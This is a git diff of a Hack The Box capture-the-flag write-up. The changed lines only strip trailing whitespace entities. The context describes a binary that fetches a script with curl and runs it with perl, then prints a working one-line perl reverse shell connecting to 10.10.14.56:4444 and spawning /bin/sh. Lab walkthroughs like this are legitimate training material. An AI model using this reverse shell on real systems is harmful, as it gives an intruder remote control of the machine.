@@ -107,7 +107,7 @@ When unzipped, we would get this MS Windows Vista Event Log.
 
 <figure><img src="../../../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>
 
-So the key here is to watch for logging and file transfers that are occurring. We can use this tool to dump the log file into a JSON file for easier reading.&#x20;
+So the key here is to watch for logging and file transfers that are occurring. We can use this tool to dump the log file into a JSON file for easier reading.
 
 {% embed url="https://github.com/omerbenamram/evtx" %}
 
@@ -149,7 +149,7 @@ We can use this to get these this information:
 3. It exeecutes `curl` and `perl` on the script we download
 4. Then it cleans up by removing the file.
 
-Simple enough. We should just need to host a perl reverse shell on our machine via Python HTTP and let this binary download and execute it.&#x20;
+Simple enough. We should just need to host a perl reverse shell on our machine via Python HTTP and let this binary download and execute it.
 
 ```perl
 use Socket;$i="10.10.14.56";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
@@ -164,4 +164,4 @@ Running...
 
 <figure><img src="../../../.gitbook/assets/image (2074).png" alt=""><figcaption></figcaption></figure>
 
-Definitely more on the CTF side of HTB.&#x20;
+Definitely more on the CTF side of HTB.
